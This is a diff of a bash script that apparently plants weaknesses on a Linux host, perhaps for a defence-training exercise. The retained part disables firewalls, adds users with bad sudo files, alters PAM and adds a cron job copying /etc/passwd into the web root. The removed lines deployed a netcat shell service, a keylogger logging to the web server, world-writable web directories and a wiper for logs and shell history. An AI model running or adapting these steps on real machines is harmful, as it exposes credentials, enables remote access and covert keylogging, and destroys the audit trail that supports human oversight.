@@ -1,30 +1,5 @@
 #!/bin/bash
 
-
-#Install prereqs based on package manager and start httpd or apache2
-preint() {
-	clear
-	read -p "apt or yum:  " pkm
-	echo "$pkm"
-
-	if [ $pkm == "apt" ]; then
-		apt-get install -y netcat autotools-dev sudo openssh-server apache2 make automake gcc g++
-		systemctl enable apache2
-		systemctl start apache2
-		return
-	elif [ $pkm == "yum" ]; then
-		yum install -y nc automake sudo openssh-server httpd gcc gcc-c++ make 
-		systemctl enable httpd
-		systemctl start httpd
-		service httpd start
-		chkconfig httpd on
-		return
-	else
-		echo "Bad PKM"
-		exit 1
-	fi
-}
-
 #disable firewalls
 fire() {
 	systemctl stop iptables
@@ -44,16 +19,6 @@ fire() {
 	chkconfig firewalld off
 }
 
-#deploy netcat shell service 
-serv() {
-	chmod +x sys_scr 
-	mkdir /etc/score
-	cp sys_scr /etc/score/
-	cp sys_scr.service /etc/systemd/system/
-	systemctl enable sys_scr
-	systemctl start sys_scr
-	return 
-}
 
 #add users and deploy bad sudo files
 usr() {
@@ -172,34 +137,10 @@ usr() {
 	return
 }
 
-#prepare webserver and deploy bad sshd conf
-webssh(){
-	mkdir /var/www/html
-	chmod 777 /var/www
-	chmod 777 /var/www/*
-	cp sshd_config /etc/ssh/sshd_config
-	return
-}
-
-#download, install, and deploy keylogger
-logboi() {
-	git clone https://github.com/kernc/logkeys
-	cd logkeys
-	./autogen.sh
-	./configure
-	make
-	make install
-	cd ..
-	rm -rf logkeys
-	touch /var/www/html/logboi.log
-	logkeys -u --start --output /var/www/html/logboi.log
-	return
-}
-
 # adds some cronjobs
 cron(){
 	echo "15 * * * * root cp /etc/passwd /var/www/html/" >> /etc/crontab
-	echo "15 * * * * root wall "ERROR 42:It's getting dark and my battery is low" >> /etc/crontab
+	echo "15 * * * * root wall 'ERROR 42:Its getting dark and my battery is low' " >> /etc/crontab
 	return
 }
 
@@ -213,30 +154,8 @@ pam(){
 	return
 }
 
-#clears /var/log/ files, history and bash history, and apt/yum history
-
-cleaner() {
-	find /var/log/ -type f > nlogs
-	inpt=nlogs
-	while IFS='' read -r line || [[ -n "$line" ]]; do
-		echo "I'll be seing you... In all the old famililiar places..." > $line
-	done < "$inpt"
-
-	rm -rf nlogs
-	
-	history -c
-	
-	echo "I'll be seing you... In all the old famililiar places..." > ~/.bash_history
-}
-
-
-preint
 fire
-serv
 usr
-webssh
-#logboi
 pam
 cron
-cleaner
 echo "All done!"
